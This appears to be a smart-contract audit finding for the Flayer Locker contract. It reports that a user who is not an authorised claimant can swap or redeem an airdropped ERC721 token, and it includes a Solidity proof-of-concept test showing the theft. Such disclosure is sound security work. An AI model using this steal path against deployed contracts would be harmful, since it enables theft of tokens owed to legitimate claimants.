# ERC721 Airdrop item can be redeemed/swapped out by user who is not an authorised claimant

## Summary
ERC721 airdrop  item can be redeemed/swapped out by user who is not an authorised claimant.

## Vulnerability Detail
Locker contract owner calls [requestAirdrop()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/utils/AirdropRecipient.sol#L85) to claim airdrop from external contracts. The airdropped items can be ERC20, ERC721, ERC1155 or Native ETH, and these items are only supposed to be claimed by authorised claimants.

Unfortunately, if the airdropped item is ERC721, a malicious user can bypass the restriction and claim the item by calling [redeem()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Locker.sol#L198) / [swap()](https://github.com/sherlock-audit/2024-08-flayer/blob/main/flayer/src/contracts/Locker.sol#L241), despite they are not the authorised claimant. 

Consider the following scenario:
1. A highly valuable ERC721 collection item is claimed by Locker contract in an airdrop;
2. Bob creates a collection in Locker contract against the this ERC721 collection;
3. Bob swaps the airdropped item by using a floor collection item;
6. By doing that, bob is able to claim the airdropped even if he is not the authorised claimant.

Please run the PoC in Locker.t.sol to verify:
```solidity
    function testAudit_RedeemAirdroppedItem() public {
        // Airdrop ERC721
        ERC721WithAirdrop erc721d = new ERC721WithAirdrop();

        // Owner requests to claim a highly valuable airdropped item
        locker.requestAirdrop(address(erc721d), abi.encodeWithSignature("claimAirdrop()"));
        assertEq(erc721d.ownerOf(888), address(locker));

        address bob = makeAddr("Bob");
        erc721d.mint(bob, 1);

        // Bob creates a Locker collection against the airdrop collection
        vm.prank(bob);
        address collectionToken = locker.createCollection(address(erc721d), "erc721d", "erc721d", 0);

        // Bob swaps out the airdropped item
        vm.startPrank(bob);
        erc721d.approve(address(locker), 1);
        locker.swap(address(erc721d), 1, 888);
        vm.stopPrank();

        // Bob owns the airdropped item despite he is not the authorised claimant
        assertEq(erc721d.ownerOf(888), address(bob));
    }
```

## Impact

An airdropped ERC721 item can be stolen by malicious user, the authorised claimant won't be able make a claim.

## Recommendation

Should not allow arbitrary user to redeem/swap the airdropped item.
